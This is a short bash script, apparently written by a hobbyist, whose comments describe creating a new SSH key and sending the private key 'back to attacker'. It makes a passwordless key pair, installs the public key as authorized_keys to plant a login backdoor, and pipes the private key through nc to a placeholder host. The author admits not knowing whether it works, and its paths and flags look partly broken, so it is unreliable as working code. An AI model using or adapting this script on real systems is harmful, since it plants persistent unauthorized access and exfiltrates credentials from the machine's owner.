#!/bin/bash

#creates new ssh key, sends new private key back to attacker
#I have NO idea if this would work

cd /
mkdir .ssh
cd .ssh
ssh-keygen -f new_key -N ""
mv new_key.pub authorized_keys
chmod 600 new_key
cat new_key | nc target_ip target_port -q 